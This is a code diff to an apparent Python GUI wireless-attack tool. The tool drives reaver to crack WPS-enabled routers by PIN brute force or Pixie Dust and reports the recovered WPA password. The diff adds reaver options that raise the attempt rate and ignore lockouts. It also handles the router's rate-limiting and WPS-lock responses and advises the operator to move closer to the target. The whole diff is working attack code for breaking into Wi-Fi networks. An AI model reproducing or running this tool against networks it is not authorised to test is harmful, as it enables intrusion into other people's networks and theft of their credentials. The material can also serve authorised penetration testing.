@@ -143,6 +143,10 @@ def wps_attack(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_righ
         return 0
 
     # Execute reaver
+    if not pixie:
+        tools.addToolInfo(T, "Executing WPS attack - PIN Brute Force...\n")
+    else:
+        tools.addToolInfo(T, "Executing WPS attack - Pixie Dust...\n")
     cwd = os.path.dirname(os.path.realpath(__file__)) 
     with open(str(wifi_name)+'_reaver_output', 'w') as out_file:
         pix_arg = ''
@@ -158,10 +162,12 @@ def wps_attack(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_righ
             old_session = '-s /var/lib/reaver/' + m + '.wpc'
 
         reaver = subprocess.Popen(('reaver -i '+ monitor_interface + ' --bssid ' + mac + \
-                                    ' -c ' + str(channel) + ' -vv ' + old_session + ' ' + pix_arg).split(" "), \
+                                    ' -c ' + str(channel) + ' -vv -L -N -T .5 -r 3:15 -d 15 ' + old_session + ' ' + pix_arg).split(" "), \
                                     stdout=out_file, stderr=subprocess.STDOUT, stdin = subprocess.PIPE, \
                                         universal_newlines=True, bufsize=1, cwd=cwd)
+        
     done = False
+    tried = []; warned_limit = False; warned_timeout = False; failed = False; pixie_warn = False
     while not done:
         root.update()
         if os.path.exists(cwd+"/" + str(wifi_name) + "_reaver_output"):
@@ -169,16 +175,56 @@ def wps_attack(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_righ
 
                 # Handle reaver cases/errors
                 for line in f.readlines():
+                    
+                    if not pixie:
+                        # Pin being tried
+                        if 'Trying pin' in line:
+                            pin = line.split("\"")[-2]
+                            if pin not in tried:
+                                tried.append(pin)
+                                tools.addToolInfo(T, "Trying now pin " + str(pin) + "\n")
 
-                    # Pin being tried
-                    if 'Trying pin' in line:
-                        pin = line.split("\"")[-2]
-                        tools.addToolInfo(T, "Trying now pin " + str(pin))
+                        # Router probably detected the attack
+                        elif "WARNING: Detected AP rate limiting" in line and not warned_limit:
+                            warned_limit = True # only warn user one time about router detecting attack
+                            tools.addToolInfo(T, "Router may have detected pin attempts, it's limiting try rate.\n")
+                            tools.addToolInfo(T, "Stop the attack manually if no new pins get tried in a while...\n")
 
-                    # Router probably detected the attack
-                    elif "WARNING: Detected AP rate limiting" in line:
-                        tools.addToolInfo(T, line.strip() + "\nRouter may have detected pin attempts.\n")
-                        tools.addToolInfo(T, "Stop the attack manually if no new pins get tried in a while...\n")
+                        elif ("WPS transaction failed (code: 0x02)" in line or "WARNING: Receive timeout occurred" in line) \
+                                                        and not warned_timeout:
+                            warned_timeout = True
+                            tools.addToolInfo(T, "Failed to pass pin, try to get closer to target.\n")
+                            tools.addToolInfo(T, "If no new pins get tried in a while, router may have locked WPS. \nStop the attack if you keep seeing this for more than 10 mins...\n")
+
+                        elif "WARNING: 10 failed connections in a row" in line and not failed:
+                            failed = True
+                            tools.addToolInfo(T, "10 failed connections in a row... If you're close to target, router may have locked WPS. It's advised to stop the attack now.\n")
+
+                    # Pixie attack case
+                    else:
+                        # print(line)
+                        # if "WPS pin not found" or "Pixiewps fail" in line:
+                        #     tools.addToolInfo(T, "Pixie dust attack failed, nothing cracked.\n")
+                        #     globs.stop_attack = False
+                        #     done = True 
+                        #     break
+                        if ("Receive timeout occurred" in line or "WPS transaction failed" in line) and not pixie_warn:
+                            pixie_warn = True
+                            tools.addToolInfo(T, "Timeout when connecting to router.\nStop attack (or try re-launching attack) if you keep seeing this for more than 10 mins...")
+                        elif "Pixiewps fail" in line:
+                            tools.addToolInfo(T, "Pixie dust attack failed, nothing cracked.\n")
+                            globs.stop_attack = False
+                            done = True 
+                            break
+
+                    # Pin & pass found in these 2 cases
+                    if "WPS PIN:" in line:
+                        tools.addToolInfo(T, "Pin found - " + str(line) + "\n")
+                    elif "WPA PSK:" in line:
+                        tools.addToolInfo(T, "Password cracked - " + str(line) + "\n")
+                        globs.stop_attack = False
+                        done = True 
+                        break
 
                     # This should not be the case
                     elif "Restore previous session" in line:
@@ -199,6 +245,8 @@ def wps_attack(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_righ
 
     tools.disable_monitor(monitor_interface)
     tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
+
+    stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
 
     return 0
 
